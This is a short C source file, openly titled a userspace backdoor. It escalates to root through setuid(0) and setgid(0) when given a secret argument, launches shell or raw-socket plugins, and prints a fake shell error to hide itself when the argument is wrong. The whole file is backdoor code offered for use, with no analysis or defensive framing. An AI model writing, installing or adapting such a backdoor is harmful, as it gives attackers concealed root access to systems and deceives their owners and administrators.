/*
    Trivial userspace backdoor
    Copyright (C) 2012  Emanuele Paiano
        nixw0rm@gmail.com

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#include "settings.h"

#if RAW == 1
#include "plugin/raw.h"
#endif

#if SHELL == 1
#include "plugin/shell.h"
#endif

int main(int argc, char *argv[])
{
 if (argc==3)
 {
  if (strcmp(argv[1], ARG1)==0)
  {
    setuid(0);
    setgid(0);
    #if RAW == 1
      raw_init();
    #endif
    #if SHELL == 1
      shell_init(argv[2]);
    #endif
  }else error();
 }else error();
}

void error()
{
 printf("/bin/sh: cannote execute binary file\n");
}
